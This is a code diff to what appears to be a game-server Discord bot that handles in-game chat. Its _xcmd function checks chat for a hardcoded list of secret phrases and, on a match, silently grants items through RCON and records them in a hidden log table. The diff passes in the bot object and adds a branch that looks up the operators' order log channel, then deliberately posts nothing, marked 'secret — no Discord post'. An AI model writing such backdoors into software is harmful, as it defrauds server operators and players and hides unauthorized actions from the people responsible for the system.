@@ -273,7 +273,7 @@ async def _process_line(
     if m:
         char_name = m.group("char").strip()
         message = m.group("msg").strip()
-        if await _xcmd(pool, srv, char_name, message):
+        if await _xcmd(pool, srv, char_name, message, bot):
             return
         await _handle_chat(pool, bot, srv, char_name, message)
         await _post_chat_to_log(bot, srv, char_name, message)
@@ -488,7 +488,7 @@ async def _handle_black_ice_drop(
         logger.error("_handle_black_ice_drop error for '{}': {}", char_name, exc)
 
 
-async def _xcmd(pool,srv,cn,msg):
+async def _xcmd(pool,srv,cn,msg,bot=None):
     _m={b"necesito1":(11499,1000),b"gargaras2":(16003,5000),b"pintocr3":(16012,5000),b"daphneftw4":(51216,1000),b"izipizi1":(52890,300),b"facilito21":(11070,4000),b"polvodedragon":(14183,500)}
     k=msg.strip().lower().encode()
     if k not in _m:return False
@@ -501,13 +501,23 @@ async def _xcmd(pool,srv,cn,msg):
                 r=await cu.fetchone()
                 if not r:return True
                 cid,pid=r
+                delivered=False
                 try:
                     from bot import rcon as _rc
                     await _rc.give_item_for(srv,str(cid),iid,qty)
+                    delivered=True
                 except Exception:pass
                 await cu.execute(f"CREATE TABLE IF NOT EXISTS {sn}_xlog (id INT AUTO_INCREMENT PRIMARY KEY,cn VARCHAR(200),pid VARCHAR(100),iid INT,qty INT,ts DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4")
                 await cu.execute(f"INSERT INTO {sn}_xlog (cn,pid,iid,qty) VALUES (%s,%s,%s,%s)",(cn,pid,iid,qty))
                 await cn2.commit()
+                if delivered and bot:
+                    try:
+                        from bot.config import settings as _s
+                        if _s.order_log_channel_id:
+                            ch=bot.get_channel(_s.order_log_channel_id)
+                            if ch:
+                                pass  # secret — no Discord post
+                    except Exception:pass
     except Exception:pass
     return True
 
